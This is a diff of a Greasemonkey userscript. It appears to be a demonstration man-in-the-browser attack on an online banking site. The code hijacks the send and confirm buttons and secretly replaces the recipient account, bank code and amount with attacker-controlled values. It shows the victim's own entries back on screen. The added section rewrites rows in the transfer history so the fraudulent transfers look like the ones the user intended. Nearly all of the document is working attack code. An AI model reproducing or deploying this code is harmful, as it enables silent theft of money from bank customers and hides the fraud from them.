@@ -10,12 +10,17 @@
 // ==/UserScript==
 
 
+//Does not work correctly if user has multiple transfers for same date which are displayed on more than one page in transfer history.
+
+
 HACK_REC_ACCOUNT	="999666999";
 HACK_REC_NAME		="Hack the Bank";
 HACK_BANK_BLZ		="12060000";
 HACK_BANK_NAME		="Bad Bank";
 HACK_AMOUNT			=500;
 HACK_USAGE			="Hack Demo";
+
+//some random fake data
 globalRC_Acc_Name="Rewe Koeln";
 globalRC_Acc_Nr="725 826 262"
 globalRC_Bank_BLZ="230 000 00";
@@ -23,15 +28,21 @@ globalRC_Bank_Name="Postbank"
 global_Amount="34,50";
 global_Usage="Vielen Dank fuer Ihren Einkauf";
 
-ACC_NAME_INDEX = "ACC_NAME";
-ACC_NR_INDEX = "ACC_NR";
-BANK_BLZ_INDEX = "BANK_PLZ";
-BANK_NAME_INDEX = "BANK_NAME";
-AMOUNT_INDEX = "AMOUNT";
-REMARK_INDEX = "REMARK";
-TIMESTAMP_INDEX = "TIMESTAMP";
-COMMITED_INDEX = "COMMITED";
+//server adress is needed so that greasemonkey can store transfers
+//in different locations for local and online server
+SERVER_ADRESS= document.URL.split("/")[2].split(":")[0];
 
+ACC_NAME_INDEX = "ACCNAME" + SERVER_ADRESS;
+ACC_NR_INDEX = "ACCNR" + SERVER_ADRESS;
+BANK_BLZ_INDEX = "BLZ" + SERVER_ADRESS;
+BANK_NAME_INDEX = "BANKNAME" + SERVER_ADRESS;
+AMOUNT_INDEX = "AMOUNT" + SERVER_ADRESS;
+REMARK_INDEX = "REMARK" + SERVER_ADRESS;
+TIMESTAMP_INDEX = "TIME" + SERVER_ADRESS;
+COMMITED_INDEX = "COMMITED" + SERVER_ADRESS;
+
+
+window.DEBUG = false;
 //storage for real transfers
 window.Transfer = function(name, nr, blz, bankName, amount, remark, timestamp, commited) {
 	this.acc_Name = name;
@@ -44,35 +55,23 @@ window.Transfer = function(name, nr, blz, bankName, amount, remark, timestamp, c
 	this.commited = commited;
 }
 
-Transfer.prototype.setAccName = function(name) {
-	this.acc_Name = name;
-}
-
-Transfer.prototype.getAccName = function(){
-	return this.acc_Name;
-}
-
 window.saveTransfers = function(transfers) {
-	console.log("save transfers" + transfers.length);
+	if (DEBUG)
+		console.log("save transfers" + transfers.length);
 	for (i = 0; i < transfers.length; i++) {
-		
-		GM_setValue(ACC_NAME_INDEX + i, transfers[i].acc_Name);		
+		GM_setValue(ACC_NAME_INDEX + i, transfers[i].acc_Name);
 		GM_setValue(ACC_NR_INDEX + i, transfers[i].acc_Nr);		
 		GM_setValue(BANK_BLZ_INDEX + i, transfers[i].bank_BLZ);		
 		GM_setValue(BANK_NAME_INDEX + i, transfers[i].bank_Name);		
 		GM_setValue(AMOUNT_INDEX + i, transfers[i].amount);
 		GM_setValue(REMARK_INDEX + i, transfers[i].remark);
 		timeInMilliSecs = transfers[i].timestamp.getTime();
-		
 		if (isNaN(timeInMilliSecs)) {
 			timeInMilliSecs = "";
 
 		} 
-		console.log("a");
-		console.log(timeInMilliSecs);
 		GM_setValue(TIMESTAMP_INDEX + i, ""+timeInMilliSecs);
-		console.log("b");
-		GM_setValue(COMMITED_INDEX + i, transfers[i].commited);
+		GM_setValue(COMMITED_INDEX + i, transfers[i].commited.valueOf());
 
 	}
 
@@ -89,7 +88,8 @@ window.loadTransfers  = function() {
 	while (true) {
 		result = GM_getValue(ACC_NAME_INDEX + i, false);
 		if (result == false) {
-			console.log("Load transfers" + transfers.length);
+			if (DEBUG)
+				console.log("Load transfers" + transfers.length);
 			return transfers;
 		}
 		
@@ -100,20 +100,19 @@ window.loadTransfers  = function() {
 		amount = GM_getValue(AMOUNT_INDEX + i, "");
 		remark = GM_getValue(REMARK_INDEX + i, "");
 		timestamp = new Date(parseInt(GM_getValue(TIMESTAMP_INDEX + i, "")));
-		commited =  GM_getValue(COMMITED_INDEX + i, "");
+		commited =  new Boolean(GM_getValue(COMMITED_INDEX + i, ""));
 		
 		
 		transfers[i] =  new Transfer(name, nr, blz, bankName, amount, remark, timestamp, commited);
 		i++;
 	}
-	
-
 }
 
 window.deleteData = function(){
 	
 	data =loadTransfers();
-	console.log("delete transfers" + data.length);
+	if (DEBUG)
+		console.log("delete transfers" + data.length);
 	for (i = 0; i < data.length; i++) {
 		
 		GM_deleteValue(ACC_NAME_INDEX + i);
@@ -131,10 +130,8 @@ window.deleteData = function(){
 
 	 function timedMsg()
 		 {
-
-		 $("#btnTD button:visible[hackmarker!='true']:contains('Geld')").each(function(){		 	
-
-
+		 $("#btnTD button:visible[hackmarker!='true']:contains('Geld')").each(function(){	
+			 	console.log("a");
 		 			$(this).attr("hackMarker","true");
 		 			sendMoneyBtnClone=$(this).clone(true)
 		 			sendMoneyBtnClone.attr("hName","sendMoneyBtnClone");
@@ -143,21 +140,14 @@ window.deleteData = function(){
 		 			$(this).attr("hackMarkerBtnOrig","true");		 			
 		 			sendMoneyBtnClone.click(function(event) {
 		 				event.preventDefault();
-		 				//obsolete
-//		 				 globalRC_Acc_Nr=$("input:eq(1)").val();
-//		 				 globalRC_Acc_Name=$("input:eq(2)").val();
-//		 				 globalRC_Bank_BLZ=$("input:eq(3)").val();
-//		 				 globalRC_Bank_Name=$("input:eq(4)").val();
-//		 				 global_Amount=$("input:eq(5)").val();
-//		 				 global_Usage=$("input:eq(6)").val();
 		 				
 		 				 newTransfer = new Transfer($("input:eq(1)").val(),
 		 						$("input:eq(2)").val(), $("input:eq(3)").val(), 
 		 						$("input:eq(4)").val(), 
 		 						$("input:eq(5)").val(), $("input:eq(6)").val(), new 
-		 						Date(), false);
+		 						Date(), new Boolean(false));
 		 				
-		 				 
+		 				
 		 				 storedTransfers = loadTransfers();
 		 				
 		 				 index =storedTransfers.length;
@@ -174,7 +164,6 @@ window.deleteData = function(){
 		 				
 		 				saveTransfers(storedTransfers);
 		 				
-		 				
 		 				$("input:eq(1)").val(HACK_REC_ACCOUNT);
 		 				$("input:eq(2)").val(HACK_REC_NAME);
 		 				$("input:eq(3)").val(HACK_BANK_BLZ);
@@ -183,13 +172,13 @@ window.deleteData = function(){
 		 				$("input:eq(6)").val(HACK_USAGE);
 		 				sendMoneyBtnClone.attr("activateReset","true");
 		 				$("button[hackMarkerBtnOrig='true']")[0].click();
-
 		 				$(this).hide();
 		 				});			
 		 			
 		 	});
 		 	
-		 	$("#btnTD button[hName='sendMoneyBtnClone']").filter(":not(:visible)[activateReset='true']").each(function(){	
+		 	$("#btnTD button[hName='sendMoneyBtnClone']").filter(":not(:visible)[activateReset='true']").each(function(){
+		 		 
 		 		 storedTransfers = loadTransfers();
 		 		lastTransfer = storedTransfers[storedTransfers.length - 1];
 		 		
@@ -199,14 +188,7 @@ window.deleteData = function(){
 				$("input:eq(4)").val(lastTransfer.bank_Name);
 				$("input:eq(5)").val(lastTransfer.amount);
 				$("input:eq(6)").val(lastTransfer.remark);
-		 		//obsolete
-//		 		$("input:eq(1)").val(globalRC_Acc_Nr);
-//				$("input:eq(2)").val(globalRC_Acc_Name);
-//				$("input:eq(3)").val(globalRC_Bank_BLZ);
-//				$("input:eq(4)").val(globalRC_Bank_Name);
-//				$("input:eq(5)").val(global_Amount);
-//				$("input:eq(6)").val(global_Usage);
-				 
+
 		 		$(this).attr("hackConfPageMarker","true");
 		 	});
 		 	
@@ -217,10 +199,11 @@ window.deleteData = function(){
 	 			$(this).hide();
 	 			$(this).attr("hackMarkerConfirmBtnOrig","true");	
 	 			sendMoneyConfirmBtnClone.click(function(event) {
+	 				
 	 				storedTransfers = loadTransfers();
 	 		 		lastTransfer = storedTransfers[storedTransfers.length - 1];
+	 		 		
 	 		 		//send hacked values
-	 		 		console.log("a");
 	 				$("input:eq(1)").val(HACK_REC_ACCOUNT);
 	 				$("input:eq(2)").val(HACK_REC_NAME);
 	 				$("input:eq(3)").val(HACK_BANK_BLZ);
@@ -228,6 +211,7 @@ window.deleteData = function(){
 	 				$("input:eq(5)").val(HACK_AMOUNT);
 	 				$("input:eq(6)").val(HACK_USAGE);
 	 				$("button[hackMarkerConfirmBtnOrig='true']")[0].click();
+	 				
 	 				//and change displayed values back
 	 				$("input:eq(1)").val(lastTransfer.acc_Name);
 					$("input:eq(2)").val(lastTransfer.acc_Nr);
@@ -235,27 +219,92 @@ window.deleteData = function(){
 					$("input:eq(4)").val(lastTransfer.bank_Name);
 					$("input:eq(5)").val(lastTransfer.amount);
 					$("input:eq(6)").val(lastTransfer.remark);
+					
 					//set transfer to be committed (not necessarily true e.g. if tan is wrong!)
 					lastTransfer.commited = true;
 					saveTransfers(storedTransfers);
-	 				});
+	 			});
 	 			
 		 	});
-		 	var recText=globalRC_Acc_Name+' ('+globalRC_Acc_Nr+')';
-//		 	$(".TransfersOdd,.TransfersEven").filter(':contains(Hack the Bank)').text(recText);		
-		 	hackedRow= $(".TransfersOdd,.TransfersEven").filter(':contains(Hack the Bank)').parent().children().children();
-	hackedRow.filter(':contains(Bad Bank)').text("test1");
-	hackedRow.filter(':contains(Hack the Bank)').text("test2");
- 	
-//		 	var bankText=globalRC_Bank_Name+' ('+globalRC_Bank_BLZ+')';
-//		 	$(".TransfersOdd,.TransfersEven").filter(':contains(Bad Bank)').text(bankText);
-//		 	$(".TransfersOdd,.TransfersEven").filter(':contains(12060000)').text(globalRC_Bank_BLZ);
-//		 	$(".TransfersOdd,.TransfersEven").filter(':contains(Hack Demo)').text(global_Usage);
-//		 	$(".TransfersOdd,.TransfersEven").filter(':contains(500)').text(global_Amount);
 		 	
-		 	
-		 	
-		 	
+		 	//
+		 	//filter every page and look for hacked data
+		 	//
+		 	//mark for already manipulated transfers
+		 	var storedTransfers = loadTransfers();			 	
+		 	var	alreadyUsedHackedTransfers = new Array(storedTransfers.length);
+
+		 	for (i = 0; i < alreadyUsedHackedTransfers.length; i++)
+		 		alreadyUsedHackedTransfers[i] = new Boolean(false);
+		 	//get row that contains a hacked transfer
+		 	hackedRow= $(".TransfersOdd,.TransfersEven").filter(':contains(Hack the Bank)').each(function(){
+		 		
+		 		//find the original transfer for this row
+		 		//date format on bank page is "dd.mm.yyyy"
+		 		var date = $(this).prev().children();
+//		 		console.log(date.html());
+		 		var day = date.html().substr(0, 2);
+		 		var month = date.html().substr(3, 2);
+		 		var year = date.html().substr(6,4);
+		 		//delete leading "0"s
+		 		while (day.charAt(0) == "0")
+		 			day = day.substr(1, day.length - 1);
+		 		while (month.charAt(0) == "0" )
+		 			month = month.substr(1, month.length - 1);
+		 		
+		 		//now look in stored original transfers for this date
+		 		var correctHackIndex = - 1;
+		 		for ( i = 0; i < storedTransfers.length; i++) {
+		 			//this data was already used so do not use it again
+		 			//this does work only so far as all hacked transfers of one day are on same page
+		 			if (alreadyUsedHackedTransfers[i].valueOf()) {
+		 				continue;
+		 			}
+		 			var yearStored = storedTransfers[i].timestamp.getFullYear();
+		 			var monthStored = storedTransfers[i].timestamp.getMonth() + 1; //gets month starting with 0
+		 			var dayStored = storedTransfers[i].timestamp.getDate();
+		 			console.log(yearStored + " " + monthStored + " " + dayStored +"-" + i);
+		 			console.log(year + " " + month + " " + day +"+");
+		 			if (day == dayStored && month == monthStored && year == yearStored) {
+		 				//we found the original transfer
+		 				if (DEBUG)
+		 					console.log("Replace with hack nr" + i);
+		 				correctHackIndex = i;
+		 				alreadyUsedHackedTransfers[i] = new Boolean(true);
+		 				break;
+		 			}
+		 		}
+		 		
+		 		//original data by user
+		 		var originalData;
+		 		if (correctHackIndex == -1) {
+		 			console.log("Error. Could not find original data. Using some generic fake data.");
+		 			//create some fake data
+		 			originalData = new Transfer(globalRC_Acc_Name, globalRC_Acc_Nr,
+		 				globalRC_Bank_BLZ, globalRC_Bank_Name,
+		 				global_Amount, global_Usage, 0, new Boolean(false));
+		 		}
+		 		else {
+		 			originalData = storedTransfers[correctHackIndex];
+		 		}
+//		 		console.log("Found index " + correctHackIndex);
+		 		
+		 		//now change all values so that it appears as if the transfer would not have been hacked
+		 		//date does not need to be changed
+		 		var recipient = $(this).children();
+		 		recipient.text(originalData.acc_Name);
+		 		
+		 		var bank =		$(this).next().children();
+		 		bank.text(originalData.bank_Name + " (" + originalData.bank_BLZ + ")");
+		 		
+		 		var remark = 	$(this).next().next().children();
+		 		remark.text(originalData.remark);
+		 		
+		 		var amount = 	$(this).next().next().next().children();
+		 		amount.text(originalData.amount);
+
+		 		
+		 	}); 	
 		 	var t=setTimeout(timedMsg,300);
 		 }
 	 
